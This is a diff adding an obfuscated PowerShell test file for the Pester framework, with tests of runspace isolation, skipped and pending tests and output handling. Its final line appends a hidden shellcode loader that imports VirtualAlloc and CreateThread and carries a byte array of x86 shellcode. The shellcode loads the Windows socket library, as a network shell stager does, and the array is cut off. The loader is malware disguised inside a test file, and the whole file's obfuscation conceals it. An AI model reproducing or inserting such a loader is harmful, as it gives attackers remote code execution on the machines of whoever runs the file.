@@ -1,0 +1,406 @@
+  &("{0}{2}{1}"-f 'se','tEm','t-i')  ("{1}{3}{2}{4}{0}" -f 'a','VaR','ABLE:','i','31e6')  ( [tyPe]("{0}{2}{1}{4}{3}"-F'sYs','cO','tEM.','Ert','Nv') ) ; &('SV') ("W"+"VE") ( [TYpE]("{5}{2}{1}{0}{3}{4}"-f 'Co','T.EN','ex','Di','Ng','sYsTEM.t') )  ;  &('Sv')  ("{0}{1}"-f 'se','FJ')  (  [type]("{1}{0}"-f 'tPtr','in'))  ; &("{2}{3}{0}{1}{4}" -f'S','tri','Se','t-','ctMode') -Version ("{2}{1}{0}"-f 't','tes','La')
+
+function iN`V`okE-PeStER`iNjOB (${SCR`iPtb`lO`ck}, [switch] ${ge`NE`RAtEnunitr`eP`O`RT}, [switch]${use`stRi`ctPES`Term`O`De}, [Switch]${v`ErbO`Se}) {
+    
+    
+    
+    
+    if (${v`er`BOsE}) {
+        &("{1}{2}{0}" -f'st','Write','-Ho') ("{0}{9}{11}{10}{12}{15}{8}{2}{18}{1}{7}{3}{16}{6}{14}{4}{5}{13}{17}"-f'----------- This','id','e (in',' ','ll',' J','r','e','op',' i','te P','s running is a separa','ester s','ob) -','She','c','a Powe','------------','s') -ForegroundColor ("{1}{0}"-f'n','Cya')
+    }
+    ${PeSTer`p`ATH} = &("{0}{2}{1}"-f'Ge','Module','t-') ("{1}{0}"-f 'r','Peste') | &("{1}{2}{3}{0}{4}"-f 'Objec','S','elec','t-','t') -First 1 -ExpandProperty ("{0}{1}"-f 'Pat','h')
+
+    ${J`oB} = &("{2}{3}{1}{0}"-f 'Job','t-','S','tar') {
+        param (${Pes`TERp`Ath}, ${tEStd`RI`VE}, ${s`CRipTbL`o`cK}, ${GENeRAteN`UN`iTr`EpORT}, ${uS`eSTRICTPES`T`ERMODE})
+        &("{0}{1}{2}" -f'Impo','rt','-Module') ${P`EsTE`RpatH} -Force | &("{2}{0}{1}"-f't-Nul','l','Ou')
+        ${s`crIPtBL`OcK} | &("{3}{2}{1}{0}" -f'nt','-Conte','t','Se') (("{8}{6}{3}{5}{2}{4}{1}{7}{0}"-f's1','st','8','t','lTemp.Te','Driveo','Tes','s.p','j5M'))."reP`lACe"(([CHAR]111+[CHAR]56+[CHAR]108),'\')."REP`LAcE"(([CHAR]106+[CHAR]53+[CHAR]77),[sTrIng][CHAR]36) | &("{2}{0}{1}" -f'ul','l','Out-N')
+
+        ${PaR`AMs} = @{
+            ("{0}{2}{1}"-f 'Pas','Thru','s') = ${T`RUE}
+            ("{1}{0}"-f 'ath','P')     = ${t`eSt`dRI`Ve}
+            ("{1}{0}" -f'ct','Stri')   = ${us`E`sTRictP`eS`T`ErmOde}
+        }
+
+        if (${G`e`NErA`T`enu`Nit`RePorT}) {
+            ${P`A`RamS}[("{2}{1}{0}"-f 'le','tputFi','Ou')] = "$TestDrive\Temp.Tests.xml"
+            ${Para`ms}[("{2}{1}{0}{3}" -f'a','tForm','Outpu','t')] = ("{1}{0}" -f'l','NUnitXm')
+        }
+
+        &("{2}{1}{0}" -f 'r','ste','Invoke-Pe') @params
+
+    } -ArgumentList  ${pes`TeRPa`TH}, ${TeS`Td`Rive}, ${sCrIPTb`LO`cK}, ${Gen`E`RaTEnunItre`port}, ${US`EsTrI`C`TpEs`TeR`MOdE}
+    if (-not ${Ver`BosE}) {
+        ${j`OB} | &("{0}{1}" -f 'Wait-J','ob') | &("{1}{0}{2}"-f'ut-Nul','O','l')
+    }
+    else {
+        
+        ${J`Ob} | &("{1}{2}{0}"-f 'b','Wait-','Jo') | &("{2}{0}{1}" -f'Jo','b','Receive-') | &("{0}{1}{2}"-f'O','u','t-Null')
+    }
+
+    if (${V`er`BOSe}) {
+        &("{1}{2}{0}"-f'ost','Write','-H') (("{3}{8}{16}{13}{11}{4}{7}{10}{0}{1}{15}{2}{14}{6}{9}{5}{17}{18}{12}" -f'e ','Pester scope ','nsi','--','of s','-------',' PowerShel','e','---','l Job) ','parat','--- End ','---','-','de a','(i','-','--','-')) -ForegroundColor ("{1}{0}" -f'yan','C')
+    }
+
+    
+    
+    
+    ${j`ob}."OutP`UT"
+    ${j`Ob}."chI`LDj`obs" | &("{2}{0}{1}"-f 'rE','ach','Fo') {
+        ${CH`IL`DjOB} = ${_}
+        
+        ${c`hIldj`ob}."o`UTP`UT"
+    }
+    ${j`oB} | &("{1}{0}{2}" -f 'ove-Jo','Rem','b')
+}
+
+&("{0}{1}{2}" -f'De','scri','be') ("{0}{3}{4}{2}{1}{5}"-f 'T',' runspac','ean','est','s running in cl','e') {
+    &('It') ("{6}{8}{1}{5}{4}{7}{0}{3}{2}"-f'n',' Skip an','ests','g t',' Pe','d','It','ndi',' -') {
+        
+        ${Te`s`Tsu`ItE} = {
+            &("{1}{0}{2}" -f 'es','D','cribe') ("{3}{4}{2}{0}{1}"-f 'nding te','sts','Pe','I','t - Skip and ') {
+
+                &('It') ("{7}{3}{2}{0}{6}{4}{1}{5}"-f'Scrip','oc',' ','out','Bl','k','t','Skip with') -skip
+                &('It') ("{5}{0}{6}{1}{3}{2}{7}{4}" -f 'ip w','m','ptB','pty Scri','k','Sk','ith e','loc') -skip {}
+                &('It') ("{1}{4}{2}{5}{0}{3}"-f'mpt','S','th no','y ScriptBlock','kip wi','t e') -Skip {("{3}{0}{2}{1}"-f'et','ng','hi','som')}
+
+                &('It') ("{3}{4}{2}{1}{0}"-f 'ing','end','it p','Im','plic') {}
+                &('It') ("{0}{1}{5}{4}{2}{3}" -f'Pending w','it','criptB','lock','S','hout ') -Pending
+                &('It') ("{5}{4}{2}{1}{6}{3}{0}"-f 'iptBlock',' wit','ing',' Scr','d','Pen','h empty') -Pending {}
+                &('It') ("{2}{4}{6}{1}{0}{7}{3}{5}"-f' S','y','Pen','iptBl','ding with ','ock','not empt','cr') -Pending {("{1}{2}{0}"-f'thing','so','me')}
+            }
+        }
+
+        ${r`Es`ULt} = &("{3}{1}{2}{0}" -f'nJob','e-Pester','I','Invok') -ScriptBlock ${t`E`st`SUITE}
+        ${rE`SU`lt}."SKIPpEd`c`OU`Nt" | &("{1}{0}"-f'uld','Sho') -Be 3
+        ${re`SuLT}."PeNDi`NGCOu`Nt" | &("{0}{2}{1}" -f 'S','ld','hou') -Be 4
+        ${rESU`lT}."tOTALC`O`UNT" | &("{0}{2}{1}" -f'Sh','d','oul') -Be 7
+    }
+
+    &('It') ("{3}{5}{4}{1}{2}{0}{6}{7}"-f'ock fa','t Scr','iptBl','It ','u','- It witho','il','s') {
+        
+        ${TES`Tsu`ite} = {
+            &("{2}{0}{1}"-f 'i','be','Descr') ("{8}{1}{6}{0}{5}{2}{3}{4}{7}"-f'h',' wi','tB','l','oc','out Scrip','t','k fails','It') {
+                &('It') ("{2}{0}{1}{3}" -f'ol','e describ','Fails wh','e')
+                &('It') ("{0}{1}{2}"-f'i','s not ru','n') { ("{1}{5}{3}{0}{4}{2}"-f 'd ','but ',' run','l','pass if it was','it wou') }
+
+            }
+        }
+
+        ${re`S`Ult} = &("{1}{0}{3}{2}"-f'n','Invoke-PesterI','ob','J') -ScriptBlock ${t`esTsu`I`Te}
+        ${REs`UlT}."P`ASSedCo`UnT" | &("{2}{1}{0}" -f 'ld','hou','S') -Be 0
+        ${ReS`U`Lt}."FAiLED`Co`UNt" | &("{0}{1}"-f'Sh','ould') -Be 1
+
+        ${rEsu`LT}."T`OtALCO`UNT" | &("{1}{0}" -f'd','Shoul') -Be 1
+    }
+
+    &('It') ("{1}{4}{2}{0}{5}{3}"-f ' PassThru o','Invok','-','ut','e-Pester ','utp') {
+        
+        ${T`eSTs`Uite} = {
+            &("{2}{1}{0}"-f'be','ri','Desc') ("{3}{2}{4}{0}{1}"-f ' outp','ut','as','P','sThru') {
+                &('it') ("{1}{0}" -f'sses','Pa') { ("{0}{1}"-f 'pas','s') }
+                &('it') ("{0}{1}"-f 'fa','ils') { throw }
+                &('it') ("{0}{1}" -f'S','kipped') -Skip {}
+                &('it') ("{0}{1}{2}" -f'Pend','in','g') -Pending {}
+            }
+        }
+
+        ${rE`su`lT} = &("{0}{5}{3}{4}{2}{1}" -f 'Invo','b','o','te','rInJ','ke-Pes') -ScriptBlock ${t`estS`UI`TE}
+        ${reS`U`LT}."p`AS`S`edCOuNt" | &("{1}{0}" -f 'uld','Sho') -Be 1
+        ${R`esulT}."fa`il`eDc`oUNT" | &("{1}{0}" -f 'ould','Sh') -Be 1
+        ${R`ESULT}."SKiP`PE`D`CouNT" | &("{0}{1}{2}"-f'Sho','u','ld') -Be 1
+        ${rES`Ult}."P`ENDIN`gC`OuNT" | &("{2}{0}{1}" -f 'h','ould','S') -Be 1
+
+        ${Re`SULT}."Tot`A`LCo`Unt" | &("{2}{0}{1}" -f'ho','uld','S') -Be 4
+    }
+
+    &('It') ("{3}{5}{14}{9}{6}{8}{1}{13}{4}{11}{12}{0}{10}{7}{2}" -f'c','x ','test scripts','Prod','r','uces valid NUnit out','n s','n ','ynta','t whe','ur i','ro','rs oc','e','pu') {
+        ${I`Nv`Al`Id`sCriPt} = '
+            Describe "Something" {
+                It "Works" {
+                    $true | Should Be $true
+                }
+            
+        '
+
+        ${rE`su`lt} = &("{1}{0}{4}{3}{2}" -f'o','Inv','b','-PesterInJo','ke') -ScriptBlock ${IN`V`AlidSc`RIpT} -GenerateNUnitReport
+
+        ${REs`ULT}."FaILEDc`o`UnT" | &("{0}{1}"-f 'Shoul','d') -Be 1
+        ${re`sU`Lt}."tOtalC`O`UNt" | &("{2}{1}{0}"-f 'd','l','Shou') -Be 1
+        ((("{1}{3}{0}{2}{4}{5}"-f 'e','TestDrive:KdITemp.','sts.','T','x','ml'))."r`EplACE"(([char]75+[char]100+[char]73),[strING][char]92)) | &("{0}{1}"-f 'S','hould') -Exist
+
+        ${x`ML} = [xml](&("{0}{1}{3}{2}" -f 'Get-C','o','tent','n') (("{2}{1}{4}{6}{5}{3}{0}" -f'sts.xml','ive','TestDr','.Te',':zV','p','UTem')).("{2}{1}{0}" -f 'E','lAC','ReP').Invoke('zVU','\'))
+
+        ${X`mL}.'test-results'.'test-suite'."R`esUL`TS".'test-suite'."na`mE" | &("{1}{2}{0}" -f 'uld','S','ho') -Not -BeNullOrEmpty
+    }
+
+    &('It') ("{5}{1}{4}{0}{3}{2}" -f'c',' St',' mode','t','ri','Invoke-Pester -') {
+        
+        ${tes`TS`UiTe} = {
+            &("{0}{1}" -f'Descri','be') ("{5}{4}{9}{7}{3}{2}{1}{10}{0}{8}{6}"-f'tests as fail','pe','and ',' ','ark skip','M','d','ed','e','p','nding ') {
+                &('It') ("{1}{0}"-f'kip','s') -Skip { ${tr`UE} | &("{0}{1}{2}" -f'Sh','ou','ld') -Be ${T`RuE} }
+                &('It') ("{1}{0}"-f'ing','pend') -Pending { ${tR`Ue} | &("{2}{1}{0}" -f 'ld','ou','Sh') -Be ${tr`UE} }
+                &('It') ("{3}{0}{2}{1}" -f 'concl','e forced','usiv','in') { &("{4}{3}{1}{2}{0}"-f'e','ncon','clusiv','stI','Set-Te') ; ${Tr`UE} | &("{0}{1}{2}"-f'Sh','o','uld') -Be ${T`RUE} }
+                &('It') ("{2}{0}{1}{4}{3}" -f'pped by',' ','ski','sult','Set-ItRe') {
+                    &("{1}{0}{2}" -f 'et-ItRe','S','sult') -Skipped -Because ("{1}{2}{3}{0}" -f 'st','it is',' a',' te')
+                }
+                &('It') ("{5}{4}{3}{0}{6}{2}{1}"-f 'tR','lt','u',' Set-I','by','pending ','es') {
+                    &("{1}{0}{2}{3}" -f't-It','Se','Resu','lt') -Pending -Because ("{2}{0}{1}"-f ' tes','t','it is a')
+                }
+                &('It') ("{3}{5}{4}{1}{0}{2}"-f ' ','by','Set-ItResult','inconclusiv',' ','e') {
+                    &("{3}{1}{2}{0}"-f't','I','tResul','Set-') -Inconclusive -Because ("{1}{2}{0}{3}" -f 'te','it is',' a ','st')
+                }
+            }
+        }
+
+        ${r`esULT} = &("{3}{0}{2}{1}" -f'vok','InJob','e-Pester','In') -ScriptBlock ${TESt`S`U`itE} -UseStrictPesterMode
+        ${RES`Ult}."P`AS`SEdCOUnT" | &("{0}{1}"-f'Shoul','d') ('Be') 0
+        ${r`eSU`LT}."f`AIlEdc`oUnt" | &("{0}{1}"-f'S','hould') ('Be') 6
+
+        ${re`SULt}."T`oTAlc`ouNt" | &("{0}{1}" -f'Sh','ould') ('Be') 6
+    }
+}
+
+&("{1}{0}" -f'ribe','Desc') (("{5}{4}{8}{3}{10}{7}{12}{16}{9}{11}{0}{15}{17}{1}{13}{18}{2}{14}{6}" -f'nn',' in','un','tee','u','G','ace)','fai','aran','p or teardown ',' It ','fail (ru','l on',' clean ','sp','in',' setu','g','r')) {
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    &('It') ("{6}{4}{3}{2}{0}{5}{1}{8}{7}" -f 'efo','e','ils if B',' fa','t','r','I','ails','Each f') {
+        ${T`ESts`U`ItE} = {
+            &("{1}{0}" -f'scribe','De') ("{8}{1}{7}{3}{0}{9}{6}{10}{5}{2}{4}" -f 't','rantee It fai','a','n se','rdown fail','r te','p','l o','Gua','u',' o') {
+                &("{3}{1}{0}{2}" -f 'c','reEa','h','Befo') {
+                    throw [System.InvalidOperationException] ("{2}{0}{1}" -f 'ti','on','test excep')
+                }
+
+                &('It') ("{1}{5}{3}{0}{4}{2}{6}" -f'foreEach','It fails ','l','e',' fai','if B','s') {
+                    ${tr`UE}
+                }
+            }
+        }
+
+        ${rES`ULT} = &("{3}{0}{4}{1}{5}{2}"-f 'voke-','ster','ob','In','Pe','InJ') -ScriptBlock ${TEs`TsUi`TE}
+
+        ${rE`Sult}."FaI`LeDco`UNt" | &("{0}{1}{2}"-f 'Sho','u','ld') -Be 1
+        ${R`eSulT}."TEstres`U`lT"[0]."FaI`LU`R`em`ESSAGE" | &("{1}{0}{2}" -f'houl','S','d') -Be ("{3}{1}{2}{0}"-f 'ption','st ','exce','te')
+    }
+
+    &('It') ("{5}{4}{1}{0}{3}{2}" -f's if AfterE','l',' fails','ach',' fai','It') {
+        ${Tes`TS`UitE} = {
+            &("{0}{2}{1}"-f'De','ribe','sc') ("{0}{8}{1}{2}{7}{6}{10}{4}{3}{9}{11}{5}"-f 'Gu','an','te',' ','setup or','wn fail',' I','e','ar','tea','t fail on ','rdo') {
+                &('It') ("{1}{2}{0}{3}{4}{5}"-f 'ls if Af','It ','fai','t','erEa','ch fails') {
+                    ${t`RUE}
+                }
+
+                &("{2}{0}{1}"-f 'er','Each','Aft') {
+                    throw [System.InvalidOperationException] ("{2}{1}{0}" -f 'on','est excepti','t')
+                }
+            }
+
+            &("{1}{0}"-f 'be','Descri') ("{11}{10}{8}{2}{3}{7}{4}{1}{5}{6}{9}{0}" -f' run',' ','re al','l the ','sts','in th','e','te',' su',' suite','ake','M') {
+                
+                &('It') ("{2}{3}{1}{0}"-f'g','in','It ','is pend') -Pending {}
+            }
+        }
+
+        ${Re`sUlt} = &("{3}{2}{1}{0}"-f 'b','voke-PesterInJo','n','I') -ScriptBlock ${t`esTSu`iTE}
+
+        if (${Re`Su`lt}."pEn`DingCoU`Nt" -ne 1) {
+            throw ("{6}{37}{9}{3}{14}{31}{22}{13}{27}{5}{16}{2}{4}{30}{7}{24}{10}{32}{1}{36}{29}{11}{23}{34}{20}{21}{8}{25}{0}{17}{15}{26}{18}{12}{33}{28}{35}{19}"-f 'pti',',',' did','n',' not','p','The test ','un to','ht ','e i','leti','s l','wn i','u',' s','n t','ace','o','o','ch.',' by an',' uncaug','arate r','ikely te',' comp','exce','hr','ns',' Af','t wa',' r','ep','on','n','rminated','terEa',' i','suit')
+        }
+
+        ${RE`SU`lt}."F`A`ILeDcou`Nt" | &("{0}{1}" -f 'Sho','uld') -Be 1
+        ${Res`Ult}."T`EsTR`EsULT"[0]."f`AilUREM`eSs`A`gE" | &("{1}{0}"-f 'ould','Sh') -Be ("{2}{3}{0}{1}"-f't exceptio','n','t','es')
+    }
+
+    &("{0}{1}" -f'Cont','ext') ("{2}{0}{1}"-f 'fa','ils','Teardown ') {
+        &('It') ("{12}{8}{10}{11}{1}{6}{16}{15}{14}{9}{3}{0}{7}{4}{2}{13}{5}"-f'/Con','s not l','in wh','pe of Describe','ext ','led','et excepti','t','led','o',' te','ardown doe','Fai','ich it fai','c','tside of the s','on propagate ou') {
+            ${T`Es`T`suitE} = {
+                ${te`ARDo`Wnfa`ILU`Re} = ${n`UlL}
+
+                try {
+                    &("{0}{1}" -f'Conte','xt') ("{3}{0}{1}{2}{4}"-f's is ','a test',' ','Thi','context') {
+                        &("{0}{2}{1}" -f'After','ll','A') {
+                            throw ("{1}{3}{0}{2}{5}{4}" -f'n ','I ','After','throw i','l','al')
+                        }
+                    }
+                }
+                catch {
+                    ${TeaRD`oWNF`Ail`URE} = ${_}
+                }
+                &('It') ("{5}{19}{14}{22}{21}{6}{1}{17}{0}{3}{10}{7}{20}{24}{8}{4}{16}{2}{9}{15}{12}{23}{18}{13}{11}" -f' exc','es not l','e/Cont','eption p','f the scope of Descr','F','own do','ts',' o','ex','ropagate ou','ed','hi','il',' ','t in w','ib','et',' it fa','ailed','i','d','tear','ch','de') {
+                    
+                    ${tE`ARD`owN`FAI`lure} | &("{1}{0}" -f'uld','Sho') -BeNullOrEmpty
+                }
+            }
+            ${R`e`suLT} = &("{2}{3}{0}{4}{1}" -f 'vo','b','I','n','ke-PesterInJo') -ScriptBlock ${t`estsu`ITE}
+
+            
+            ${rE`su`lt}."pA`S`sed`COunT" | &("{1}{0}"-f 'd','Shoul') -Be 1
+
+            
+            ${r`ESU`LT}."f`AILedCO`UnT" | &("{1}{0}"-f 'd','Shoul') -Be 1
+        }
+    }
+}
+
+&("{0}{2}{1}"-f 'D','scribe','e') ("{0}{1}{3}{2}"-f'Swall','owi','t','ng outpu') {
+    &('It') ("{5}{7}{2}{1}{8}{0}{3}{6}{4}"-f'p','ter','voke-Pes','y path returns only test res','lts','I','u','n',' hap') {
+        ${Te`S`TS} = {
+            &("{0}{1}" -f'Desc','ribe') ("{5}{1}{8}{0}{2}{7}{3}{6}{4}"-f' ','a','p','y ','esults','Invoke-Pester h','test r','ath returns onl','ppy') {
+
+                &("{2}{0}{1}" -f't','ent','Set-Con') -Path ((("{2}{6}{1}{3}{4}{0}{5}"-f'c','Invoke-','TestD','M','yFun','tion.ps1','rive:oJ7'))."r`e`PLaCe"(([CHar]111+[CHar]74+[CHar]55),[sTRinG][CHar]92)) -Value @'
+                    function Invoke-MyFunction
+                    {
+                        return $true;
+                }
+'@
+
+                &("{2}{1}{0}{3}" -f 't','Con','Set-','ent') -Path ((("{5}{1}{0}{2}{4}{7}{6}{3}"-f 'e:r','iv','Q','1','MInvok','TestDr','s.ps','e-MyFunction.Test'))."r`ePlA`CE"(([ChAr]114+[ChAr]81+[ChAr]77),'\')) -Value @'
+                    . "TestDrive:\Invoke-MyFunction.ps1"
+                    Describe "Invoke-MyFunction Tests" {
+                        It "Should not throw" {
+                            Invoke-MyFunction
+                        }
+                    }
+'@;
+
+                &('It') ("{9}{5}{3}{10}{2}{0}{1}{4}{11}{8}{7}{6}"-f' o','ut','st','wallow','put wi','d s','u','assThr',' -P','Shoul',' te','th') {
+
+                    ${R`eSuLTS} = &("{0}{1}{3}{2}" -f'Invoke-Pe','st','r','e') -Script ((("{7}{0}{4}{10}{3}{2}{1}{6}{8}{9}{5}"-f'Drive','tio','Func','My',':i','ps1','n.Test','Test','s','.','OdInvoke-')).("{0}{1}"-f 'RePLAC','E').Invoke('iOd','\')) -PassThru -Show ("{1}{0}" -f'ne','No');
+
+                    
+                    
+                    
+                    @(, ${RE`S`ULTs}) | &("{1}{0}" -f 'ld','Shou') -BeOfType ("{4}{0}{2}{3}{1}" -f'Cust','ect]','o','mObj','[PS')
+                    ${rE`sUL`Ts}."tOT`Al`couNT" | &("{1}{0}{2}" -f'l','Shou','d') -Be 1
+
+                    
+                    
+                    
+
+                }
+
+                &('It') ("{4}{3}{1}{0}{6}{8}{7}{2}{5}{9}" -f'allo','ld sw','hout','u','Sho',' -','w tes','t wit','t outpu','PassThru') {
+                    ${R`E`Sults} = &("{0}{1}{2}{3}{4}"-f'I','nvok','e-Pes','t','er') -Script ((("{5}{2}{11}{4}{8}{3}{9}{10}{6}{0}{1}{7}" -f'on.Tes','ts','estDri','-M','e:C2','T','uncti','.ps1','qInvoke','y','F','v'))  -RePlace'C2q',[cHAr]92) -Show ("{0}{1}"-f'N','one')
+                    ${R`esuL`Ts} | &("{0}{2}{1}"-f 'Sh','uld','o') -Be ${nu`LL}
+                }
+
+            }
+        }
+
+        ${re`S`UlT} = &("{5}{4}{2}{3}{1}{0}"-f'nJob','erI','-Pes','t','voke','In') -ScriptBlock ${Tes`Ts}
+        ${re`suLt}."PAs`sEDC`Ount" | &("{1}{0}"-f 'ould','Sh') ('Be') 2
+        ${re`s`ULt}."fai`led`C`ouNt" | &("{1}{0}" -f'ould','Sh') ('Be') 0
+        ${r`ESult}."To`TAL`Count" | &("{0}{1}" -f 'Shoul','d') ('Be') 2
+    }
+
+    &('It') ("{5}{10}{9}{6}{0}{1}{7}{3}{8}{2}{4}" -f'p','eline o','r-',' syst','test','Invoke-Pest','wallows pi','utput from','em-unde','r s','e') {
+        ${teS`TS} = {
+            &("{1}{0}" -f'ibe','Descr') ("{9}{5}{1}{8}{3}{0}{10}{2}{7}{6}{4}"-f'pipeli','est','t','allows ','-test','voke-P','from system-under','put ','er sw','In','ne ou') {
+
+                &("{0}{2}{1}{3}"-f'Set','o','-C','ntent') -Path ((("{5}{0}{6}{4}{1}{2}{3}" -f'e:{0','ke-MyFunction.p','s','1','Invo','TestDriv','}'))-F[cHar]92) -Value @'
+                    Write-Output "my system-under-test output"
+                    function Invoke-MyFunction
+                    {
+                        return $true
+                    }
+'@;
+
+                &("{1}{2}{0}" -f't','Set-C','onten') -Path ((("{1}{0}{5}{4}{3}{2}{6}" -f 'estDrive:AN','T','Function.','-My','Invoke','2','Tests.ps1'))."r`eplaCE"(([CHAr]65+[CHAr]78+[CHAr]50),'\')) -Value @'
+                    . "TestDrive:\Invoke-MyFunction.ps1"
+                    Describe "Invoke-MyFunction Tests" {
+                        It "Should not throw" {
+                            Invoke-MyFunction
+                        }
+                    }
+'@;
+
+                &('It') ("{8}{7}{0}{5}{10}{4}{6}{9}{1}{2}{3}" -f'd ','a','ss','Thru','low','swa',' te','houl','S','st output with -P','l') {
+
+                    ${re`SUL`Ts} = &("{1}{0}{2}{3}" -f'e-P','Invok','es','ter') -Script ((("{7}{1}{4}{2}{11}{5}{12}{9}{10}{8}{6}{0}{3}" -f'ests.','st','v','ps1','Drive:H','v','.T','Te','ction','e-MyFu','n','cIn','ok')) -crepLacE ([CHAR]72+[CHAR]118+[CHAR]99),[CHAR]92) -PassThru -Show ("{0}{1}" -f 'N','one')
+
+                    
+                    
+                    
+                    @(, ${REs`Ul`TS}) | &("{1}{2}{0}" -f 'uld','Sh','o') -BeOfType ("{2}{3}{0}{1}" -f'ect',']','[P','SCustomObj')
+                    ${rEs`U`LTs}."Tot`Alco`Unt" | &("{0}{1}"-f 'S','hould') -Be 1
+
+                    
+                    
+                    
+
+                }
+
+                &('It') ("{7}{1}{3}{4}{5}{6}{0}{2}{8}"-f' ','hould s','wi','wallow test',' o','ut','put','S','thout -PassThru') {
+                    ${rESUl`Ts} = &("{1}{2}{0}" -f'r','Invoke-P','este') -Script ((("{5}{0}{3}{7}{9}{8}{2}{1}{6}{4}" -f'estDriv','n.T','o','e:YzOInv','ps1','T','ests.','oke-M','i','yFunct'))."re`pLa`ce"(([ChAr]89+[ChAr]122+[ChAr]79),[sTRiNg][ChAr]92)) -Show ("{1}{0}" -f'ne','No')
+                    ${rEsU`l`Ts} | &("{0}{1}{2}"-f 'Sho','ul','d') -Be ${N`ULl}
+                }
+
+            }
+        }
+
+        ${r`eS`UlT} = &("{0}{1}{3}{2}"-f'Inv','oke-Pe','Job','sterIn') -ScriptBlock ${Te`STS}
+        ${Resu`lT}."pa`sS`eDcoUnt" | &("{1}{0}"-f'hould','S') ('Be') 2
+        ${RE`sU`lt}."fA`I`lEDC`OunT" | &("{0}{2}{1}" -f 'Sh','ld','ou') ('Be') 0
+        ${rES`Ult}."tOTa`lC`oUNT" | &("{2}{0}{1}" -f'houl','d','S') ('Be') 2
+    }
+
+    &('It') ("{1}{8}{5}{3}{13}{0}{7}{4}{12}{10}{9}{2}{6}{11}" -f's ','Inv','t f','llo','e','a','rom test ','pip','oke-Pester sw',' outpu','ine','script','l','w') {
+        ${t`e`sTS} = {
+
+            &("{2}{1}{0}" -f 'e','crib','Des') ("{5}{7}{8}{6}{2}{0}{3}{4}{1}" -f'tput from','ipt',' ou',' test s','cr','In','pipeline','voke-Pester swallows',' ') {
+
+                &("{3}{0}{2}{1}"-f't','tent','-Con','Se') -Path ((("{8}{1}{3}{6}{7}{2}{5}{4}{0}"-f'ps1','stD','v','ri','ction.','oke-MyFun','ve:{0}','In','Te'))-f [chAR]92) -Value @'
+                    function Invoke-MyFunction
+                    {
+                        return $true
+                    }
+'@;
+
+                &("{1}{3}{0}{2}"-f'-','S','Content','et') -Path ((("{12}{4}{11}{10}{0}{5}{9}{6}{1}{3}{7}{2}{8}" -f '}','MyFuncti','s.','on.T','t','Invo','-','est','ps1','ke','rive:{0','D','Tes'))-F[CHar]92) -Value @'
+                    . "TestDrive:\Invoke-MyFunction.ps1"
+                    Write-Output "my test script output"
+                    Describe "Invoke-MyFunction Tests" {
+                        It "Should not throw" {
+                            Invoke-MyFunction
+                        }
+                    }
+'@;
+
+                &('It') ("{8}{1}{3}{4}{7}{2}{0}{6}{5}" -f'h -','w','wit','allow',' test ou','Thru','Pass','tput ','Should s') {
+
+                    ${Re`s`UltS} = &("{0}{3}{2}{1}{4}"-f 'I','e','oke-Pest','nv','r') -Script ((("{4}{8}{6}{1}{2}{3}{5}{7}{0}" -f'n.Tests.ps1','ZInv','ok','e-My','T','Functi','ve:dq','o','estDri'))-rePlACe'dqZ',[ChAr]92) -PassThru -Show ("{1}{0}"-f 'one','N')
+
+                    
+                    
+                    
+                    @(, ${resu`L`TS}) | &("{0}{1}"-f'S','hould') -BeOfType ("{2}{0}{1}{3}{4}"-f 'S','Cus','[P','tom','Object]')
+                    ${RE`su`Lts}."t`oTaL`coUNT" | &("{0}{1}"-f'Shou','ld') -Be 1
+
+                    
+                    
+                    
+
+                }
+
+                &('It') ("{9}{1}{5}{7}{8}{4}{0}{6}{3}{2}" -f'with','uld swallo','hru','-PassT',' ','w t','out ','est',' output','Sho') {
+                    ${re`suL`Ts} = &("{1}{2}{3}{0}"-f'-Pester','Invo','k','e') -Script ((("{5}{3}{6}{9}{4}{2}{8}{1}{7}{0}" -f '1','on.T','un','ve','MyF','TestDri',':{0}Invok','ests.ps','cti','e-')) -f[Char]92) -Show ("{0}{1}"-f'Non','e')
+                    ${Re`SUL`Ts} | &("{1}{2}{0}"-f 'd','Sho','ul') -Be ${NU`Ll}
+                }
+            }
+        }
+
+        ${Res`UlT} = &("{2}{1}{0}{3}" -f'st','ke-Pe','Invo','erInJob') -ScriptBlock ${T`EsTS}
+        ${r`ESuLt}."pASSe`dc`Ount" | &("{1}{2}{0}"-f 'uld','Sh','o') ('Be') 2
+        ${ReSU`LT}."FAiLe`D`CO`UNt" | &("{1}{0}"-f 'ld','Shou') ('Be') 0
+        ${r`ESU`LT}."TO`T`ALC`OUnT" | &("{2}{1}{0}" -f 'd','l','Shou') ('Be') 2
+    }
+}
+
+${U`GM} = '$usQ9 = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $usQ9 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50